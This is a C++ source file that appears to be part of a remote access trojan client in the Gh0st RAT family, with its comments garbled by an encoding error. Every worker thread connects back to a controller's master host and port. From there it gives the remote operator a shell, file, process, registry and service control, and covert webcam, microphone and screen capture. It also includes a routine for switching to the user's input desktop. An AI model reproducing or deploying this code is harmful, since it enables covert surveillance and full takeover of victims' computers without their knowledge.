#include "StdAfx.h"
#include "Common.h"
#include "ClientSocket.h"
#include "KernelManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "FileManager.h"
#include "AudioManager.h"
#include "ScreenManager.h"
#include "Talk.h"
#include "VideoManager.h"
#include "RegManager.h"
#include "ServerManager.h"



/*

  HANDLE hThread = MyCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MyMain, 
		(LPVOID)g_strHost,0,NULL);              

*/


HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, 
					   SIZE_T dwStackSize,                      
					   LPTHREAD_START_ROUTINE lpStartAddress,   //MyMain //CallBack
					   LPVOID lpParameter,                      //127.0.0.1  //lpParm
					   DWORD dwCreationFlags,                   
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	Arg;
	Arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	Arg.arglist = (void *)lpParameter;
	Arg.bInteractive = bInteractive;
	Arg.hEventTransferArg = CreateEvent(NULL,FALSE,FALSE,NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, 
		dwStackSize,ThreadLoader, &Arg, dwCreationFlags, (unsigned *)lpThreadId);
	
	WaitForSingleObject(Arg.hEventTransferArg, INFINITE);	
	CloseHandle(Arg.hEventTransferArg);	
	return hThread;
}



unsigned int __stdcall ThreadLoader(LPVOID lpParam)  //MyMain  127.0.0.1
{
	unsigned int	nRet = 0;
#ifdef _DLL
	try
	{
#endif	
		THREAD_ARGLIST	Arg;
		memcpy(&Arg, lpParam, sizeof(Arg));
		SetEvent(Arg.hEventTransferArg);
		// ��׿�潻��
	//	if (arg.bInteractive)
	//		SelectDesktop(NULL);
		
		nRet = Arg.start_address(Arg.arglist);    //�����������������Լ��Ļص�����


#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

//�ú����ǹ��ܺ�����Ҫ���Ǳ��ض�����һ���������ƶ˽���Զ���ն˵�Socket
DWORD WINAPI LoopShellManager(SOCKET sRemote)   
{
	CClientSocket	socketClient;

	//�����ƶ˵�IP �Ͷ˿�
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	
	CShellManager	Manager(&socketClient);   //ע�⸸��Ĺ��캯��this �ǵ�ǰ������ָ��
	
	socketClient.RunEventLoop();              //���뽫���������� ���� socketClient����Recve�����ӵ��ĶԷ��ر�Disconnect�������� 
	
	return 0;
}

//�ù�����Զ�̽��̹���
DWORD WINAPI LoopSystemManager(SOCKET sRemote)   
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	Manager(&socketClient,COMMAND_SYSTEM);
	
	socketClient.RunEventLoop();
	
	return 0;
}




//�ù�����Զ�̴��ڹ���
DWORD WINAPI LoopWindowManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost,
		CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	
	CSystemManager	Manager(&socketClient,COMMAND_WSLIST);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//�ù�����Զ���ļ�����
DWORD WINAPI LoopFileManager(SOCKET sRemote)
{
	//---�����׽�����
	CClientSocket	socketClient;
	//����
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	CFileManager	Manager(&socketClient);
	socketClient.RunEventLoop();            
	
	return 0;
}




//�ù�����Զ������ͷ
DWORD WINAPI LoopVideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	Manager(&socketClient);
	socketClient.RunEventLoop();
	return 0;
}


//�ù�����Զ����Ƶ����
DWORD WINAPI LoopAudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	Manager(&socketClient);
	socketClient.RunEventLoop();
	return 0;
}

//�ù���Զ���������
DWORD WINAPI LoopScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopTalkManager(SOCKET sRemote)   
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	Talk	TalkManager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//ע������
DWORD WINAPI LoopRegeditManager(SOCKET sRemote)         
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CRegManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//�������
DWORD WINAPI LoopServicesManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CServerManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME,
		&strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded); 
	//�õ��û���Ĭ�Ϲ�����
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop,
		UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);   
	//�õ��û���ǰ�Ĺ�����
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}